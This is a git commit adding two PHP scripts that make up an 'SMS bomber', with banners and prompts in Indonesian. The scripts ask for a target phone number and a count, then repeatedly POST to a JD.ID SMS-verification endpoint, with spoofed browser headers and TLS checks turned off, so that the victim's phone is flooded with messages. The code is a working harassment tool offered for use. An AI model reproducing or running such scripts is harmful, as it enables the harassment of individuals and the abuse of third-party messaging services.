b552009c62eaff2c8757394e548f85298aedc7ea
Senitopeng <35752325+Senitopeng@users.noreply.github.com>
2018-03-07 16:19:39 +0800

    Add files via upload

---
+++ menu/phd.php
@@ -0,0 +1,22 @@
+<?php
+include 'bomphd.php';
+
+/*
+    https://github.com/nee48/BomSmsPhD
+    Made by Handika Pratama
+    Modified by まやちゃん
+*/
+
+$init = new Bom();
+
+//Eksekusi Sms Boomber
+echo "  Contoh  628××××××××××\n\n [Nomor Target]: ";
+$a = trim(fgets(STDIN));
+$init->no = "$a";
+echo " [Jumlah Misil]: ";
+$b = trim(fgets(STDIN));
+print("============================================================");
+$loop = "$b";
+for ($i=0; $i < $loop; $i++) {
+    $init->Verif($init->no);
+}
---
+++ menu/sms.php
@@ -0,0 +1,41 @@
+<?php
+function jdidbom($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+		echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+echo "
+############################################################
+    Spammer SMS From JD.ID
+    Coded By    : ZeroSvn
+    Contact Me  : babbycyberteam@gmail.com
+    Date        : 12/12/2017
+    Thanks to   : BabbyCyberTeam & SGB-TEAM
+    Penggunaan  : Awali Dengan Angka [8]
+############################################################\n";
+echo "\n \e[93m------------------\n Contoh 8××××××××××\n ------------------\n\n Nomor Target : ";
+$nomor = trim(fgets(STDIN));
+echo " Jumlah Paket : ";
+$jumlah = trim(fgets(STDIN));
+echo " Masukkan Jeda: ";
+$jeda = trim(fgets(STDIN));
+echo "\e[93m____________________________________________________________\n";
+$execute = jdidbom($nomor, $jumlah, $jeda);
+print $execute;
+?>
